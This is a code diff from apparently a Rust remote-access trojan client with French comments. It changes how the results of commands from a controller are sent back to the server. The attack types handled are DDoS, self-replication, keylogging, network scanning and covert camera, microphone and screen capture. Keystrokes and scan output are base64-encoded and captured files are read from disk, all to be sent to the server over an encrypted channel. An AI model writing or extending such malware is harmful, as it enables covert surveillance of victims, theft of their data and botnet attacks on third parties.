@@ -516,14 +516,22 @@ fn main() -> io::Result<()> {
                     match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, &stream_clone) {
                         Ok(output) => {
                             // si l'attaque ne nécessite pas d'envoyer de fichier
-                            if type_attack != "picture" && type_attack != "record" && type_attack != "keylogger" && type_attack != "screenshot"{
+                            if type_attack == "ddos" || type_attack == "autorep"{
                                 let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
                                 send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
 
-                            }else{
 
+                            // si l'attaque nécessite d'envoyer de la donnée à garder
+                            }else if type_attack == "keylogger" || type_attack == "scan"{
+                                let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(output.as_bytes()));
+                                // println!("{:?}", response);
+                                send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
+                                
+
+                            // si l'attaque nécessite d'envoyer un fichier
+                            }else if type_attack == "picture" || type_attack == "record" || type_attack == "keylogger" || type_attack == "screenshot"{
                                 // lecture du fichier
-                                println!("{:?}", output);
+                                // println!("{:?}", output);
                                 let file_path = output.replace("\n", "");
 
                                 match fs::read(file_path.clone()){
